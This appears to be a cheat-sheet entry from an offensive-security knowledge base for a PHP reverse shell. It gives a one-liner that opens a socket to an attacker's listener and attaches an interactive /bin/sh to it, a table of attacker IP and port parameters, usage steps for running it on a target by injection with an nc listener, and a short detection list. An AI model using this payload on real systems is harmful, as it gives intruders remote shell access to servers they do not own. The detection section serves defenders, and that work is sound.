---
id: 416a392d-91ca-4c16-8d1b-b2c2e3d3f92e
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:24.289304+00:00'
updated_at: '2023-04-10T20:25:26.707920+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - php
  - payload
validated: true
---

# PHP-Proc-Open-Reverse-Shell

## Code

```bash
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

## Description

This one-liner uses PHP's fsockopen to establish a socket connection and proc_open to launch an interactive shell (/bin/sh -i), mapping the socket to the process's stdin, stdout, and stderr streams via an array. It provides a stable reverse shell without relying on file descriptor tricks, suitable for environments where other execution methods are limited.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's listener | 10.0.0.1 |
| $_ATTACKER_PORT | Port on which the attacker is listening (e.g., via netcat) | 4242 |

## Usage

Replace placeholders with your listener details. Execute on the target via PHP CLI or injection. Start listener first: `nc -lvnp 4242`. This method is referenced in [[procedures/Establish-PHP-Reverse-Shell]] as an alternative for robust shell access. The $pipes variable handles stream communication automatically.

## Detection

- Monitoring for proc_open calls in PHP logs or runtime.
- Unusual socket connections from PHP to external hosts.
- Behavioral alerts on PHP processes creating persistent child shells.
- SIEM rules for proc_open combined with fsockopen patterns.
